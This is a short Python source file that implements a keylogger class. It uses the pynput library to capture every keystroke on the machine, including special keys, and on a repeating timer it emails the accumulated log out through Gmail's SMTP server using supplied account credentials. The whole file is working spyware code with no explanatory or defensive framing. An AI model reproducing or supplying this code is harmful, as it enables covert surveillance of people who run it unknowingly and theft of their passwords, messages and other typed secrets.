from time import sleep
import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger Started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log= self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char) #for printing character keys
            self.append_to_log(current_key)
        except AttributeError:
            if key==key.space:
                current_key =" "
                self.append_to_log(current_key)
            else:
                current_key =" "+str(key)+" " #for printing special keys
                self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email,self.password,"\n\n" + self.log)
        self.log=""
        timer=threading.Timer(self.interval,self.report)
        timer.start()

    def send_mail(self,email, password, message):
        # Use the correct SMTP server for Gmail
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()  # Start TLS encryption
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener=pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
